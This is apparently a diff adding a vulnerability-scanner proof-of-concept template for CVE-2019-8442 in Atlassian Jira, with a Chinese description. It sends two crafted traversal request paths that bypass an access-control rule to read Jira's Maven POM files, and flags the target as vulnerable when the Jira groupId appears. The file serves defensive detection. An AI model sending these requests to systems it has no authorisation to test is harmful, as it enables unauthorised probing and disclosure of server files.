@@ -1,0 +1,46 @@
+[info]
+author = "ave"
+description = "Atlassian Jira 目录遍历漏洞验证，通过构造特制请求路径绕过 CachingResourceDownloadRewriteRule 的访问控制，读取 META-INF 目录下的 Maven POM 配置文件，检测响应体中是否包含 com.atlassian.jira 组标识以确认漏洞存在"
+id = "POC-AVE-2019-0199"
+name = "CVE-2019-8442 PoC"
+severity = "high"
+tags = ["ave-2019-0199"]
+vuln_id = [
+    "CVE-2019-8442",
+    "AVE-2019-0199",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/s/anything/_/WEB-INF/classes/META-INF/maven/com.atlassian.jira/jira-core/pom.xml"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<groupId>com.atlassian.jira</groupId>"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/s/anything/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<groupId>com.atlassian.jira</groupId>"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
